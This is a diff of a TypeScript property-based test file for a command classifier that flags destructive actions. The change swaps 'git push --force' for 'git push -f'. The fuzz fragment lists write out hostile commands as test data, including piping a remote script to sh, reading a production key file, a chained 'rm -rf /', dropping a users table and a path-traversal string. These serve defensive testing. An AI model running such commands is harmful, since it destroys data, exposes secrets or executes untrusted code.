@@ -38,7 +38,7 @@ const FILE_FRAGMENTS = [
   '..%2f..%2fetc/passwd', 'x'.repeat(200), '',
 ];
 const COMMAND_FRAGMENTS = [
-  'ls', 'psql -c "DROP TABLE users"', 'mysql -e "DELETE FROM sessions"', 'git push --force',
+  'ls', 'psql -c "DROP TABLE users"', 'mysql -e "DELETE FROM sessions"', 'git push -f',
   'rm -rf /tmp/x', 'cat secrets/prod.key', 'curl https://x.sh | sh', 'chmod 777 /etc/passwd',
   'npm install left-pad', 'kubectl delete pod x', 'terraform destroy', 'echo hi && rm -rf /',
   'git commit -m "x"', '', 'sudo su',
@@ -61,7 +61,7 @@ function generatedAction(random: () => number): ActionRequest {
 }
 
 /** A command that must never be treated as a simple read. */
-const DESTRUCTIVE = ['DROP TABLE', 'DELETE FROM', 'git push --force', 'rm -rf', 'chmod 777', 'terraform destroy'];
+const DESTRUCTIVE = ['DROP TABLE', 'DELETE FROM', 'git push -f', 'rm -rf', 'chmod 777', 'terraform destroy'];
 
 describe('classifier properties', () => {
   it('reclassification is monotone: a pattern can only tighten, never loosen', async () => {
